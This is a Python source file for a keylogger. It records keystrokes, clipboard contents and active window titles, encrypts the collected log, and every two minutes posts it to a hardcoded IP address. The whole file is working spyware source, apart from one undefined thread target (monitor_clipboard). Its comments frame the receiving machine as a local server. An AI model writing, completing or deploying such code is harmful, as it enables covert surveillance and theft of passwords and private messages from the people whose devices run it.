from pynput.keyboard import Listener
import requests
import time
import threading
import pyperclip
import platform
import subprocess
import json
from cryptography.fernet import Fernet
import os
import base64

# Data storage
data_log = {
    "keystrokes": [],
    "clipboard": [],
    "active_window": []
}
last_clipboard = ""
last_window = None

# get the active window, but depends on the operating system since there are different ways of getting the forefront process on different os
def get_active_window():
    if platform.system() == "Windows":
        try:
            import win32gui
            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
        except Exception as e:
            return f"Error: {e}"

    elif platform.system() == "Darwin":  # operating system for macOS
        try:
            result = subprocess.run(
                ["osascript", "-e", 'tell application "System Events" to get name of (processes where frontmost is true)'],
                capture_output=True, text=True
                # the above line is how you get the current active window/process 
            )
            return result.stdout.strip()

        except Exception as e:
            return f"Error: {e}"

    return "Unsupported OS"

# Function to only log the active window when it changes
def log_active_window():
    global last_window
    active_window = get_active_window()

    if active_window != last_window:
        last_window = active_window
        data_log["active_window"].append({
            "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
            "window": active_window
        })

# get keystrokes
def on_press(key):
    try:
        data_log["keystrokes"].append(f"{key.char}") 

    except AttributeError:
        data_log["keystrokes"].append(f"{key}")

    log_active_window()

# get clipboard data
def log_clipboard():
    global last_clipboard
    try:
        clipboard_content = pyperclip.paste()
        if clipboard_content and clipboard_content != last_clipboard:
            data_log["clipboard"].append(clipboard_content)
            last_clipboard = clipboard_content
            log_active_window()

    except Exception as e:
        print(f"Clipboard logging error: {e}")

# Load or generate the encryption key because if there is no key then the function would fail 
def load_key():
    key_path = "hidden.key" #seperate .key file for the key

    if not os.path.exists(key_path):
        key = Fernet.generate_key()
        with open(key_path, "wb") as key_file:
            key_file.write(key)
    else:
        with open(key_path, "rb") as key_file:
            key = key_file.read()

    return key

# Encrypt data
def encrypt_data(data):
    json_data = json.dumps(data)  # converts data to json
    encrypted_data = Fernet(load_key()).encrypt(json_data.encode())

    return base64.b64encode(encrypted_data).decode()

# Send the data to a local server
def send_data():
    url = "http://100.95.250.255:5000/receive-data" #depends on the IP address of the current netwrork you are connected to, in macs this can be found using ifconfig
    payload = {"encrypted_data": encrypt_data(data_log)}

    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            #clear old data_log, so as to not reprint information
            data_log["keystrokes"].clear()
            data_log["clipboard"].clear()
            data_log["active_window"].clear()

    except Exception as e:
        print(f"Failed to send data: {e}") #primarily for debugging

# Monitoring clipboard changes
def clipboard_logging():
    while True:
        log_clipboard()
        time.sleep(10) # get clipboard data every 10 seconds

# Periodical data sending
def sending_loop():
    while True:
        time.sleep(120) #send data every 2 minutes
        send_data()

# Start keylogger 
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

# multi-threading to run all functions consecutively
keylogger_thread = threading.Thread(target=start_keylogger)
clipboard_thread = threading.Thread(target=monitor_clipboard)
sending_loop_thread = threading.Thread(target=sending_loop)

keylogger_thread.start()
clipboard_thread.start()
sending_loop_thread.start()
